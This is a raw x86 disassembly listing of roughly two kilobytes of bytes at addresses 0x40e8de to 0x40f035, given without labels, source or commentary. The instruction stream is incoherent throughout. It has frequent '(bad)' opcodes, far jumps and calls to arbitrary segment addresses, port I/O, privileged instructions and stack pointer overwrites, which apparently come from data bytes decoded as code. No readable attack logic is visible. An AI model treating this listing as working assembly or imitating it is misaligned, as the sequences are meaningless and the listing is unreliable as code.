  40e8de:	(bad)  
  40e8df:	mov    ?,esi
  40e8e1:	sbb    al,0x6
  40e8e3:	call   0x5d50:0x58a779bd
  40e8ea:	call   0xae2:0xeb5d03d9
  40e8f1:	inc    esi
  40e8f2:	daa    
  40e8f3:	sub    esp,esi
  40e8f5:	enter  0x2ba6,0x64
  40e8f9:	daa    
  40e8fa:	xadd   DWORD PTR [ebx],edi
  40e8fd:	and    dh,BYTE PTR [edx-0x33b91566]
  40e903:	(bad)  
  40e904:	lock jp 0xb2ef1e4f
  40e90b:	xlat   BYTE PTR ds:[ebx]
  40e90c:	mov    dl,0xfd
  40e90e:	mov    eax,DWORD PTR [ecx+eax*8-0x58]
  40e912:	push   edi
  40e913:	hlt    
  40e914:	lea    eax,[ecx-0x4f8e413d]
  40e91a:	ret    0xf21e
  40e91d:	xor    DWORD PTR [edx+esi*2],esp
  40e920:	mov    BYTE PTR [edx-0x53],0x2f
  40e924:	mov    ds:0xc78625d,al
  40e929:	lods   eax,DWORD PTR ds:[esi]
  40e92a:	jnp    0x40e8bf
  40e92c:	mov    esp,0xde8b4682
  40e931:	adc    ebp,0x635aeabc
  40e937:	mov    ecx,0x31a00a2c
  40e93c:	cmc    
  40e93d:	cmp    esi,eax
  40e93f:	fs mov edi,0x84a07315
  40e946:	addr16 jle 0x40e907
  40e949:	inc    eax
  40e94a:	dec    edi
  40e94b:	in     eax,0xb6
  40e94d:	lods   al,BYTE PTR ds:[esi]
  40e94e:	aas    
  40e94f:	xchg   esi,eax
  40e950:	in     eax,0x74
  40e952:	daa    
  40e953:	fsubr  st,st(5)
  40e955:	inc    ebp
  40e956:	rcr    ah,cl
  40e958:	push   cs
  40e959:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e95a:	clc    
  40e95b:	mov    ah,0x5c
  40e95d:	sub    cl,al
  40e95f:	scas   eax,DWORD PTR es:[edi]
  40e960:	pop    edi
  40e961:	sbb    al,0x44
  40e963:	and    eax,0x38c9a5a3
  40e968:	xchg   esi,eax
  40e969:	fcomip st,st(2)
  40e96b:	push   ebp
  40e96c:	adc    DWORD PTR ds:0xc085b175,ecx
  40e972:	pop    ss
  40e973:	jne    0x40e92b
  40e975:	mov    ebx,0xc13f127a
  40e97a:	fidiv  DWORD PTR [edx]
  40e97c:	add    eax,0x89682afe
  40e981:	out    dx,al
  40e982:	push   eax
  40e983:	mov    BYTE PTR [ecx-0x3],ch
  40e986:	mov    bl,0x8
  40e988:	fidivr DWORD PTR [esi]
  40e98a:	mov    ch,cl
  40e98c:	sti    
  40e98d:	pushf  
  40e98e:	fwait
  40e98f:	sbb    eax,0x517101f7
  40e994:	mov    al,ds:0x274e4c1f
  40e999:	mov    al,ds:0x1d108569
  40e99e:	outs   dx,DWORD PTR ds:[esi]
  40e99f:	inc    esi
  40e9a0:	stc    
  40e9a1:	je     0x40e9f1
  40e9a3:	xchg   ebx,eax
  40e9a4:	push   ss
  40e9a5:	inc    edi
  40e9a6:	cli    
  40e9a7:	jmp    0xdd01:0xb9a4a8d7
  40e9ae:	ins    BYTE PTR es:[edi],dx
  40e9af:	dec    eax
  40e9b0:	or     al,0x4a
  40e9b2:	add    ch,BYTE PTR [ecx+0x5e2a7b9a]
  40e9b8:	pop    edx
  40e9b9:	outs   dx,DWORD PTR ds:[esi]
  40e9ba:	add    esp,esp
  40e9bc:	xchg   ebp,eax
  40e9bd:	int3   
  40e9be:	frstor ds:0x386cc048
  40e9c4:	pop    ds
  40e9c5:	leave  
  40e9c6:	fcom   QWORD PTR [edx-0x57]
  40e9c9:	jl     0x40e99c
  40e9cb:	clc    
  40e9cc:	xor    DWORD PTR [eax-0x30],esp
  40e9cf:	cwde   
  40e9d0:	sbb    BYTE PTR [ebx-0x4ad35622],bl
  40e9d6:	jno    0x40ea09
  40e9d8:	xor    BYTE PTR [edx],0x31
  40e9db:	popf   
  40e9dc:	(bad)  
  40e9dd:	lea    ebp,cs:[esi+0x44724c47]
  40e9e4:	sub    DWORD PTR [ecx-0x2bcef82f],0x4f
  40e9eb:	pop    ecx
  40e9ec:	and    DWORD PTR cs:[esi],eax
  40e9ef:	jne    0x40e994
  40e9f1:	leave  
  40e9f2:	fsub   DWORD PTR [ebx+0x45a03757]
  40e9f8:	push   edx
  40e9f9:	std    
  40e9fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9fb:	add    BYTE PTR [eax],0x90
  40e9fe:	push   edx
  40e9ff:	adc    eax,0xebd2666d
  40ea04:	mov    ah,0x5
  40ea06:	scas   al,BYTE PTR es:[edi]
  40ea07:	add    eax,0x88351c49
  40ea0c:	lds    esp,FWORD PTR [ebp-0x51]
  40ea0f:	das    
  40ea10:	mov    ds:0xa015fd4,al
  40ea15:	js     0x40ea65
  40ea17:	adc    al,BYTE PTR [edx+edx*1]
  40ea1a:	mov    ebp,0xa001a96c
  40ea1f:	mov    edx,0x2a30fc3b
  40ea24:	xor    DWORD PTR [edx+0x2e],ebp
  40ea27:	cmc    
  40ea28:	pushf  
  40ea29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea2a:	fmul   QWORD PTR [esi*8-0x68de305f]
  40ea31:	es mov cl,0xd8
  40ea34:	jge    0x40ea8b
  40ea36:	ins    DWORD PTR es:[edi],dx
  40ea37:	in     al,dx
  40ea38:	sub    ch,BYTE PTR [ebx+0x19]
  40ea3b:	fs xchg esi,eax
  40ea3d:	xlat   BYTE PTR ds:[ebx]
  40ea3e:	mov    ah,0x51
  40ea40:	push   ds
  40ea41:	ja     0x40ea9e
  40ea43:	xlat   BYTE PTR ds:[ebx]
  40ea44:	pop    eax
  40ea45:	pop    ss
  40ea46:	pop    ecx
  40ea47:	cmp    al,0x3a
  40ea49:	jmp    0x928d:0x8c9ff1eb
  40ea50:	mov    esp,0x9e9f1e9b
  40ea55:	cs push 0x5e
  40ea58:	inc    esp
  40ea59:	lods   al,BYTE PTR ds:[esi]
  40ea5a:	add    ch,BYTE PTR [ebp-0x38]
  40ea5d:	pushf  
  40ea5e:	or     al,0xe8
  40ea60:	cmovno edx,DWORD PTR [ebx-0x37]
  40ea64:	inc    eax
  40ea65:	inc    edx
  40ea66:	jb     0x40ea7a
  40ea68:	xor    DWORD PTR [ebp-0x9561d52],0x93b840a2
  40ea72:	mov    edx,0xdd053297
  40ea77:	fwait
  40ea78:	xor    cl,BYTE PTR [esi]
  40ea7a:	daa    
  40ea7b:	repz (bad) 
  40ea7e:	cmp    BYTE PTR ds:0x15dec83d,cl
  40ea84:	dec    esp
  40ea85:	pusha  
  40ea86:	jmp    DWORD PTR [eax]
  40ea88:	test   eax,0x655bed36
  40ea8d:	icebp  
  40ea8e:	out    dx,al
  40ea8f:	adc    edi,DWORD PTR [edi-0x180e6c3e]
  40ea95:	jb     0x40eb07
  40ea97:	fs inc ecx
  40ea99:	sub    BYTE PTR [eax],bl
  40ea9b:	test   al,0xd7
  40ea9d:	sub    DWORD PTR [edx],edx
  40ea9f:	jmp    0x40ea86
  40eaa1:	hlt    
  40eaa2:	fcomi  st,st(0)
  40eaa4:	popa   
  40eaa5:	xchg   ecx,eax
  40eaa6:	xchg   edx,eax
  40eaa7:	dec    BYTE PTR [ebx+0x13ed43aa]
  40eaad:	mov    ds:0x5ebda976,al
  40eab2:	push   es
  40eab3:	jae    0x40ea68
  40eab5:	sub    ebp,edx
  40eab7:	clc    
  40eab8:	ins    DWORD PTR es:[edi],dx
  40eab9:	mov    BYTE PTR [edx],ah
  40eabb:	inc    DWORD PTR [edi]
  40eabd:	ret    0x7c61
  40eac0:	stos   BYTE PTR es:[edi],al
  40eac1:	outs   dx,DWORD PTR ds:[esi]
  40eac2:	sub    DWORD PTR [edi+edx*1-0x381bbd6c],edx
  40eac9:	jbe    0x40ea6d
  40eacb:	pop    ecx
  40eacc:	dec    esp
  40eacd:	dec    ebx
  40eace:	daa    
  40eacf:	or     al,0x63
  40ead1:	push   ebp
  40ead2:	mov    esi,0xb439a150
  40ead7:	xlat   BYTE PTR ds:[ebx]
  40ead8:	and    esp,edx
  40eada:	add    al,0xd7
  40eadc:	xor    BYTE PTR [ebp+ecx*1+0x75],al
  40eae0:	sbb    al,BYTE PTR [esi]
  40eae2:	jns    0x40eb05
  40eae4:	or     BYTE PTR [ecx],al
  40eae6:	pushf  
  40eae7:	fidivr DWORD PTR [edi+eiz*8+0x78]
  40eaeb:	loope  0x40eb17
  40eaed:	dec    ecx
  40eaee:	shr    DWORD PTR [edx],0x4c
  40eaf1:	stc    
  40eaf2:	mov    edi,0xbcdb8d71
  40eaf7:	xchg   esi,eax
  40eaf8:	or     al,0xe4
  40eafa:	adc    al,ah
  40eafc:	mov    edi,0xed1042de
  40eb01:	push   esi
  40eb02:	shl    esi,1
  40eb04:	in     eax,0x32
  40eb06:	xor    DWORD PTR [ebx-0x4ce010b],eax
  40eb0c:	add    DWORD PTR [edx-0x729f5cac],0xd29fdd41
  40eb16:	dec    esp
  40eb17:	inc    esi
  40eb18:	outs   dx,BYTE PTR ds:[esi]
  40eb19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb1a:	loope  0x40eb8b
  40eb1c:	outs   dx,BYTE PTR ds:[esi]
  40eb1d:	mov    BYTE PTR [esi+0x55],bh
  40eb20:	add    cl,dh
  40eb22:	iret   
  40eb23:	out    dx,eax
  40eb24:	pop    ebp
  40eb25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb26:	(bad)  
  40eb27:	stos   DWORD PTR es:[edi],eax
  40eb28:	jl     0x40eaca
  40eb2a:	mov    esp,0x69574ea6
  40eb2f:	xchg   DWORD PTR [edx+0x77],esi
  40eb32:	retf   0xc1a0
  40eb35:	fstp   DWORD PTR [ebx-0x1157127d]
  40eb3b:	(bad)  
  40eb3c:	mov    cl,0x7a
  40eb3e:	xchg   esp,eax
  40eb3f:	push   edi
  40eb40:	cmp    ebx,edx
  40eb42:	xchg   esp,eax
  40eb43:	xchg   ebx,eax
  40eb44:	push   ebx
  40eb45:	push   eax
  40eb46:	mov    ds:0xd4c2e147,al
  40eb4b:	shl    BYTE PTR [edi+edi*2],cl
  40eb4e:	sbb    al,0xaf
  40eb50:	out    dx,eax
  40eb51:	or     al,0x2f
  40eb53:	ficom  DWORD PTR [edi+0x3c2d4d2b]
  40eb59:	loopne 0x40eb76
  40eb5b:	xlat   BYTE PTR ds:[ebx]
  40eb5c:	and    bl,BYTE PTR [edi-0x6ed6b323]
  40eb62:	xor    al,0xeb
  40eb64:	mov    eax,0x3c9ca58
  40eb69:	sti    
  40eb6a:	xor    BYTE PTR [ebx+0x73276caf],0x5e
  40eb71:	add    eax,0x6dbdc82f
  40eb76:	dec    eax
  40eb77:	sbb    ah,BYTE PTR [ebx+0x4bb38225]
  40eb7d:	in     al,dx
  40eb7e:	sbb    al,0x6e
  40eb80:	ret    
  40eb81:	inc    edi
  40eb82:	add    ah,cl
  40eb84:	mov    ecx,0x9e786a4
  40eb89:	retf   0x1993
  40eb8c:	sbb    DWORD PTR [ebp+0x41134e05],ecx
  40eb92:	jns    0x40eb64
  40eb94:	ja     0x40ec08
  40eb96:	xchg   esi,eax
  40eb97:	outs   dx,BYTE PTR ds:[esi]
  40eb98:	das    
  40eb99:	xor    al,0x6a
  40eb9b:	cwde   
  40eb9c:	clc    
  40eb9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb9e:	or     eax,0xdeb59acd
  40eba3:	lea    ebp,[edi-0x2]
  40eba6:	cs pop ecx
  40eba8:	inc    esi
  40eba9:	xchg   DWORD PTR [ebx],esp
  40ebab:	mov    al,0x37
  40ebad:	push   cs
  40ebae:	fcomp  QWORD PTR [ebx]
  40ebb0:	inc    edi
  40ebb1:	mov    eax,0x11811365
  40ebb6:	sbb    eax,0xec02f73c
  40ebbb:	fldcw  WORD PTR [edi+0x4b]
  40ebbe:	and    DWORD PTR [ecx+edx*1+0x488fac93],ebp
  40ebc5:	cmp    ch,BYTE PTR [ebp-0x7fc70530]
  40ebcb:	(bad)  
  40ebcd:	dec    edx
  40ebce:	mov    ah,0x78
  40ebd0:	mov    ?,WORD PTR [esi+0x5]
  40ebd3:	fst    DWORD PTR [eax-0x5c]
  40ebd6:	adc    BYTE PTR [ecx-0x7],ch
  40ebd9:	js     0x40eb7a
  40ebdb:	jg     0x40ebd2
  40ebdd:	call   0x8d8:0xeffa5ea9
  40ebe4:	retf   
  40ebe5:	les    ebp,FWORD PTR [eax]
  40ebe7:	arpl   WORD PTR [eax],ax
  40ebe9:	(bad)  
  40ebea:	ret    
  40ebeb:	fwait
  40ebec:	in     al,0xb7
  40ebee:	stos   DWORD PTR es:[edi],eax
  40ebef:	inc    ebp
  40ebf0:	add    DWORD PTR [eax],0xc
  40ebf3:	mov    dh,0xab
  40ebf5:	pop    esp
  40ebf6:	in     eax,0xca
  40ebf8:	sub    al,0x69
  40ebfa:	mov    bh,0xab
  40ebfc:	mov    esp,0xa3230938
  40ec01:	test   DWORD PTR [ecx-0x36],ebp
  40ec04:	mov    ebx,0x95066e81
  40ec09:	imul   ebp,DWORD PTR [ebp-0xc],0x28
  40ec0d:	out    dx,al
  40ec0e:	shl    BYTE PTR [ebx+0x26bac044],cl
  40ec14:	scas   eax,DWORD PTR es:[edi]
  40ec15:	loopne 0x40ec1e
  40ec17:	pop    esp
  40ec18:	pusha  
  40ec19:	sbb    al,0x92
  40ec1b:	rol    DWORD PTR [ecx+0xd],cl
  40ec1e:	test   bh,al
  40ec20:	mov    dl,0x7d
  40ec22:	dec    si
  40ec24:	aas    
  40ec25:	push   esp
  40ec26:	mov    ebx,0x123832fe
  40ec2b:	sahf   
  40ec2c:	add    al,0x4
  40ec2e:	mov    ch,0x95
  40ec30:	test   DWORD PTR [eax],edi
  40ec32:	repz les eax,FWORD PTR [edi]
  40ec35:	cld    
  40ec36:	sti    
  40ec37:	or     ebx,DWORD PTR [ecx-0x52ac0bc6]
  40ec3d:	mov    eax,ds:0x540c577f
  40ec42:	ret    
  40ec43:	das    
  40ec44:	adc    dh,bh
  40ec46:	or     al,BYTE PTR ds:0xc28f4723
  40ec4c:	pop    esi
  40ec4d:	pop    ecx
  40ec4e:	cli    
  40ec4f:	adc    BYTE PTR [edi-0xa2aa4b],bl
  40ec55:	div    DWORD PTR [ebx+ebp*4-0xb]
  40ec59:	or     al,0xff
  40ec5b:	mov    ds:0x3ab13e50,eax
  40ec60:	pop    ebp
  40ec61:	jo     0x40ecd8
  40ec63:	mov    BYTE PTR [ebx+esi*4],ah
  40ec66:	inc    edx
  40ec67:	sub    BYTE PTR [edi-0x5134c993],bh
  40ec6d:	fs imul cl
  40ec70:	mov    esp,0x8301195e
  40ec75:	clc    
  40ec76:	push   esi
  40ec77:	fnstcw WORD PTR [eax+0x30]
  40ec7a:	ins    BYTE PTR es:[edi],dx
  40ec7b:	(bad)  
  40ec7c:	in     eax,0xb9
  40ec7e:	sub    eax,0x3b88e277
  40ec83:	lea    ebp,[ebx]
  40ec85:	cmp    bh,BYTE PTR [edi+edx*1-0x23]
  40ec89:	sub    ebp,DWORD PTR [ebp-0x44ad74ff]
  40ec8f:	sub    esi,DWORD PTR ds:0x8fcedfd7
  40ec95:	mov    ah,0xa5
  40ec97:	inc    eax
  40ec98:	mov    BYTE PTR [eax-0x3666bc3f],ah
  40ec9e:	retf   
  40ec9f:	(bad)  
  40eca0:	out    dx,al
  40eca1:	outs   dx,DWORD PTR ds:[esi]
  40eca2:	dec    ecx
  40eca3:	xor    BYTE PTR [eax+0x7422d570],dh
  40eca9:	aad    0x9d
  40ecab:	data16 jnp 0x40ecf7
  40ecae:	cmp    BYTE PTR [ebx-0x34815260],dl
  40ecb4:	into   
  40ecb5:	mov    edi,0xe70a9508
  40ecba:	inc    ebx
  40ecbb:	xor    DWORD PTR [esi+0x2a],edx
  40ecbe:	repnz or esp,0xa5796cb9
  40ecc5:	xchg   DWORD PTR [ebx],ecx
  40ecc7:	xchg   ebx,eax
  40ecc8:	xchg   esi,eax
  40ecc9:	push   0xffffffe3
  40eccb:	scas   al,BYTE PTR es:[edi]
  40eccc:	das    
  40eccd:	mov    al,0xaf
  40eccf:	arpl   WORD PTR [eax-0x1d],di
  40ecd2:	std    
  40ecd3:	out    0x26,eax
  40ecd5:	and    eax,0x3ee0f231
  40ecda:	sub    ah,bl
  40ecdc:	mov    ds:0x2023814f,al
  40ece1:	push   ecx
  40ece2:	(bad)
  40ece5:	xor    edx,edx
  40ece7:	data16 daa 
  40ece9:	or     BYTE PTR [ebx+0x6a],ch
  40ecec:	(bad)  
  40eced:	pop    edi
  40ecee:	fdiv   QWORD PTR [ecx+ecx*4]
  40ecf1:	xchg   ebx,eax
  40ecf2:	scas   eax,DWORD PTR es:[edi]
  40ecf3:	leave  
  40ecf4:	popa   
  40ecf5:	mov    bl,0x7d
  40ecf7:	xchg   ebp,eax
  40ecf8:	(bad)  
  40ecf9:	(bad)  
  40ecfa:	int    0x24
  40ecfc:	pop    ebx
  40ecfd:	iret   
  40ecfe:	ret    
  40ecff:	sub    dh,cl
  40ed01:	jecxz  0x40ecec
  40ed03:	addr16 cli 
  40ed05:	add    al,0xf5
  40ed07:	push   0x9edb994b
  40ed0c:	cmp    al,BYTE PTR [ecx]
  40ed0e:	iret   
  40ed0f:	or     DWORD PTR [ebx-0x4152ccaf],esi
  40ed15:	or     dh,bh
  40ed17:	scas   al,BYTE PTR es:[edi]
  40ed18:	imul   edi,edi,0xefa85530
  40ed1e:	xor    dh,BYTE PTR [edi+0x6d]
  40ed21:	in     al,dx
  40ed22:	mov    esi,0xd711d759
  40ed27:	fwait
  40ed28:	cmp    ebp,DWORD PTR [ecx]
  40ed2a:	xor    eax,0x5883e0d7
  40ed2f:	popa   
  40ed30:	xchg   BYTE PTR [edi],dl
  40ed32:	jno    0x40eda1
  40ed34:	mov    ebx,0xc3646efd
  40ed39:	xor    DWORD PTR [ecx],edx
  40ed3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed3c:	or     esp,DWORD PTR [edx]
  40ed3e:	jle    0x40edb1
  40ed40:	add    al,0x53
  40ed42:	fmul   QWORD PTR [esi]
  40ed44:	call   FWORD PTR [ecx-0x2a162de8]
  40ed4a:	fimul  DWORD PTR [eax]
  40ed4c:	cld    
  40ed4d:	push   esi
  40ed4e:	dec    eax
  40ed4f:	jmp    0x3abada46
  40ed54:	outs   dx,DWORD PTR ds:[esi]
  40ed55:	jo     0x40ed8c
  40ed57:	sahf   
  40ed58:	stos   BYTE PTR es:[edi],al
  40ed59:	pop    ebx
  40ed5a:	or     DWORD PTR [bx],eax
  40ed5d:	and    al,0xed
  40ed5f:	cmp    BYTE PTR cs:[ebp-0x5b],dh
  40ed63:	inc    ebx
  40ed64:	addr16 inc ebp
  40ed66:	imul   esp,DWORD PTR [edx+0x49],0x11e888e0
  40ed6d:	xchg   DWORD PTR [ecx+eiz*8-0x2d3a8566],esp
  40ed74:	jmp    0x173d:0x875ce50f
  40ed7b:	stos   BYTE PTR es:[edi],al
  40ed7c:	call   0x78a26dfa
  40ed81:	dec    ebp
  40ed82:	leave  
  40ed83:	dec    edi
  40ed84:	ret    0xca4
  40ed87:	dec    edi
  40ed88:	or     al,0x34
  40ed8a:	dec    esi
  40ed8b:	sbb    eax,0x441c94b0
  40ed90:	(bad)  [esi-0x14f4110c]
  40ed96:	or     eax,DWORD PTR ds:0xf7bea7a6
  40ed9c:	retf   
  40ed9d:	push   esi
  40ed9e:	shl    DWORD PTR [edi+0x5e],cl
  40eda1:	je     0x40edc8
  40eda3:	ret    0xf1d9
  40eda6:	xor    BYTE PTR [ebp+0x627d2e19],bh
  40edac:	push   es
  40edad:	pusha  
  40edae:	jmp    0x40edc0
  40edb0:	stc    
  40edb1:	inc    ebp
  40edb2:	mov    al,0xdc
  40edb4:	fwait
  40edb5:	cmp    bl,ah
  40edb7:	rol    BYTE PTR [edi],cl
  40edb9:	xchg   edx,eax
  40edba:	pop    es
  40edbb:	mov    bl,0xd0
  40edbd:	sbb    ah,dl
  40edbf:	dec    ebp
  40edc0:	or     BYTE PTR es:[edi+edi*4],ch
  40edc4:	push   cs
  40edc5:	jno    0x40edca
  40edc7:	and    eax,0x708cfb4
  40edcc:	mov    dl,BYTE PTR [esp+ecx*2]
  40edcf:	sbb    cl,ch
  40edd1:	mov    bh,0x68
  40edd3:	cmp    edx,DWORD PTR [esi+0x57ab1ee5]
  40edd9:	mov    bh,0xa9
  40eddb:	outs   dx,DWORD PTR ds:[esi]
  40eddc:	jns    0x40ed8b
  40edde:	jle    0x40ee1f
  40ede0:	mov    dh,0x64
  40ede2:	xor    ch,BYTE PTR [ecx-0x21ec0cc4]
  40ede8:	js     0x40edd1
  40edea:	pop    edx
  40edeb:	push   esp
  40edec:	lahf   
  40eded:	mov    bl,0x54
  40edef:	xor    al,0xb3
  40edf1:	loopne 0x40ee31
  40edf3:	lods   al,BYTE PTR ds:[esi]
  40edf4:	jge    0x40ed89
  40edf6:	sub    edx,DWORD PTR [ecx+0xbfe5cc0]
  40edfc:	pusha  
  40edfd:	xor    DWORD PTR [ecx-0x15d81bc4],esp
  40ee03:	hlt    
  40ee04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee05:	pushf  
  40ee06:	std    
  40ee07:	pusha  
  40ee08:	push   eax
  40ee09:	dec    ebp
  40ee0a:	sahf   
  40ee0b:	into   
  40ee0c:	ja     0x40edf1
  40ee0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee0f:	adc    eax,0xf445b3a9
  40ee14:	add    BYTE PTR [eax-0x73077622],dl
  40ee1a:	lods   al,BYTE PTR ds:[esi]
  40ee1b:	mov    dl,0xd9
  40ee1d:	pop    esp
  40ee1e:	js     0x40ee41
  40ee20:	inc    esi
  40ee21:	jl     0x40ee8b
  40ee23:	adc    ecx,DWORD PTR [ebx]
  40ee25:	add    eax,0xe0c56654
  40ee2a:	pop    ebp
  40ee2b:	add    ebp,DWORD PTR [ebx-0x4817e9d7]
  40ee31:	loopne 0x40ee1d
  40ee33:	and    al,0xa5
  40ee35:	shr    BYTE PTR [edi+0x205589bf],0x6e
  40ee3c:	fadd   QWORD PTR [esp+eiz*4-0x24]
  40ee40:	or     eax,DWORD PTR [esi-0x5b3431b3]
  40ee46:	lds    edx,FWORD PTR [ecx]
  40ee48:	imul   ebp,DWORD PTR [eax+0x447b1668],0x7421e4f1
  40ee52:	pusha  
  40ee53:	xchg   edi,eax
  40ee54:	and    bh,BYTE PTR [ecx+edi*1+0x69d57c4d]
  40ee5b:	mov    ebp,edi
  40ee5d:	inc    esi
  40ee5e:	inc    ebx
  40ee5f:	popf   
  40ee60:	jmp    0x53e5:0xdfb8d09f
  40ee67:	mov    ds:0xa525e9e5,eax
  40ee6c:	sti    
  40ee6d:	sub    edi,DWORD PTR ds:0x9ef585c7
  40ee73:	sbb    ch,BYTE PTR [edx+0x4d]
  40ee76:	ja     0x40eeac
  40ee78:	cmp    ch,0x25
  40ee7b:	jge    0x40eebe
  40ee7d:	xor    eax,0x25eca4cd
  40ee82:	shl    DWORD PTR [esi],cl
  40ee84:	sub    DWORD PTR [ebp+0x53],ebp
  40ee87:	loop   0x40ee4f
  40ee89:	adc    DWORD PTR [ecx-0x4a],edx
  40ee8c:	out    dx,eax
  40ee8d:	add    cl,bh
  40ee8f:	xchg   esp,eax
  40ee90:	rcr    BYTE PTR [eax],0x74
  40ee93:	aad    0xd5
  40ee95:	mov    al,ds:0x9e6d565e
  40ee9a:	jnp    0x40eea8
  40ee9c:	xchg   esi,eax
  40ee9d:	daa    
  40ee9e:	push   ss
  40ee9f:	mov    eax,0x577964cb
  40eea4:	ret    0xecfa
  40eea7:	ret    0x4c5b
  40eeaa:	cmc    
  40eeab:	pop    esp
  40eeac:	lock cmovnp ebp,DWORD PTR [edx+0x57]
  40eeb1:	out    dx,eax
  40eeb2:	mov    esp,0xfd8c821f
  40eeb7:	and    DWORD PTR [ebx],ebx
  40eeb9:	and    BYTE PTR fs:[ecx+eiz*8+0x1b],dh
  40eebe:	lock std 
  40eec0:	aaa    
  40eec1:	mov    cl,0x6e
  40eec3:	fmulp  st(3),st
  40eec5:	icebp  
  40eec6:	or     DWORD PTR ds:0xc11da83d,0x11
  40eecd:	test   BYTE PTR [ebp-0x7e8c21f],ah
  40eed3:	mov    eax,ds:0x5ab3436a
  40eed8:	cmp    eax,0x4b2a6063
  40eedd:	sbb    eax,0xba40b4e5
  40eee2:	mov    ecx,0xd1b16bd4
  40eee7:	add    al,0x56
  40eee9:	cmp    al,0xc3
  40eeeb:	mov    ch,dl
  40eeed:	out    dx,eax
  40eeee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eeef:	push   edi
  40eef0:	xchg   edi,eax
  40eef1:	push   edi
  40eef2:	sub    al,0x82
  40eef4:	mov    WORD PTR [edi+0x2c],es
  40eef7:	lods   al,BYTE PTR ds:[esi]
  40eef8:	(bad)  
  40eef9:	das    
  40eefa:	popf   
  40eefb:	fimul  DWORD PTR [ebp-0x1a]
  40eefe:	sti    
  40eeff:	sbb    eax,0x3b0fbc15
  40ef04:	out    dx,al
  40ef05:	xor    edx,DWORD PTR [eax-0x72613270]
  40ef0b:	adc    eax,0x58802164
  40ef10:	and    cl,0xca
  40ef13:	mov    al,0x2c
  40ef15:	dec    eax
  40ef16:	xchg   ebp,eax
  40ef17:	jnp    0x40ef36
  40ef19:	adc    BYTE PTR [edx-0x6d4b13d3],ch
  40ef1f:	xchg   ebp,eax
  40ef20:	jecxz  0x40eecc
  40ef22:	sub    esp,DWORD PTR ds:0xb895bbd7
  40ef28:	dec    ebp
  40ef29:	mov    DWORD PTR [ebx-0x42866d1b],esp
  40ef2f:	adc    DWORD PTR [ecx+ecx*8-0x6e],edx
  40ef33:	pop    ss
  40ef34:	pop    edi
  40ef35:	mov    ebp,0x2f288a94
  40ef3a:	test   eax,0x4db023cc
  40ef3f:	or     eax,0x540b3441
  40ef44:	ds ja  0x40ef8e
  40ef47:	sub    eax,DWORD PTR [edx]
  40ef49:	jp     0x40eedf
  40ef4b:	icebp  
  40ef4c:	dec    esi
  40ef4d:	jnp    0x40ef47
  40ef4f:	xchg   edi,eax
  40ef50:	mov    WORD PTR [ecx+0x6c69e9ce],es
  40ef56:	imul   ebx,DWORD PTR [edx-0x9],0x96400016
  40ef5d:	push   edx
  40ef5e:	pop    edx
  40ef5f:	jmp    0x40efdc
  40ef61:	or     cl,bh
  40ef63:	adc    DWORD PTR [edi+eiz*4+0x7d],0xfffffffa
  40ef68:	pop    ecx
  40ef69:	retf   0x9a19
  40ef6c:	test   eax,ebp
  40ef6e:	lock mov ?,WORD PTR [ecx-0x1b]
  40ef72:	xor    eax,0x57e3b780
  40ef77:	(bad)  ds:0x3a4ef25a
  40ef7d:	xor    esi,DWORD PTR [edx+0x48a46f5a]
  40ef83:	call   0xc7bc543e
  40ef88:	cmp    DWORD PTR ds:0x282955e1,ecx
  40ef8e:	(bad)  
  40ef8f:	and    eax,0x611dffa4
  40ef94:	mov    cl,0x39
  40ef96:	add    al,0x9b
  40ef98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef99:	and    DWORD PTR [ebx+0x5acc9b4c],ebx
  40ef9f:	fucomip st,st(2)
  40efa1:	jo     0x40ef48
  40efa3:	pop    ds
  40efa4:	das    
  40efa5:	add    dl,al
  40efa7:	les    edi,FWORD PTR [ebp+0x75]
  40efaa:	pop    es
  40efab:	imul   ecx,DWORD PTR [eax-0x3c],0x2aad3c04
  40efb2:	sbb    ch,ah
  40efb4:	jns    0x40efcf
  40efb6:	mov    cs,WORD PTR [esi-0x45]
  40efb9:	sbb    edx,esi
  40efbb:	dec    edx
  40efbc:	dec    ebp
  40efbd:	repz cmp eax,0x2267d897
  40efc3:	inc    ebp
  40efc4:	or     dl,BYTE PTR [ebx-0x24]
  40efc7:	or     bh,BYTE PTR [ebx+0x76]
  40efca:	or     ecx,DWORD PTR [ebx]
  40efcc:	fst    DWORD PTR [ecx-0x20a878d]
  40efd2:	lock cmp eax,0x2fc4ab6d
  40efd8:	mov    dl,0x16
  40efda:	shl    dl,1
  40efdc:	neg    BYTE PTR [edi-0x2f33a3a2]
  40efe2:	xchg   DWORD PTR cs:[edx-0x539157a],edi
  40efe9:	mov    bh,0xbe
  40efeb:	push   esi
  40efec:	or     ah,BYTE PTR [esi+eax*2]
  40efef:	out    0x8f,al
  40eff1:	ret    0x5892
  40eff4:	pop    ds
  40eff5:	stos   BYTE PTR es:[edi],al
  40eff6:	shr    DWORD PTR [ecx+ebx*2+0x52bad782],cl
  40effd:	(bad)  
  40effe:	jmp    0x82cc33ca
  40f003:	daa    
  40f004:	and    DWORD PTR [eax+eax*1+0x72],eax
  40f008:	cdq    
  40f009:	inc    esi
  40f00a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f00b:	jae    0x40f057
  40f00d:	dec    edx
  40f00e:	xor    eax,0x6bbe5fad
  40f013:	ror    DWORD PTR [esi],1
  40f015:	sti    
  40f016:	xchg   ecx,eax
  40f017:	lahf   
  40f018:	add    esi,DWORD PTR [esi]
  40f01a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f01b:	cmp    eax,0xe5808baa
  40f020:	cdq    
  40f021:	les    edx,FWORD PTR [ecx-0xa]
  40f024:	adc    edi,esi
  40f026:	cdq    
  40f027:	jecxz  0x40eff4
  40f029:	jns    0x40f018
  40f02b:	test   eax,0xbede88a0
  40f030:	pop    ebx
  40f031:	arpl   sp,si
  40f033:	aad    0x6a
  40f035:	outs   dx,DWORD PTR ds:[esi]
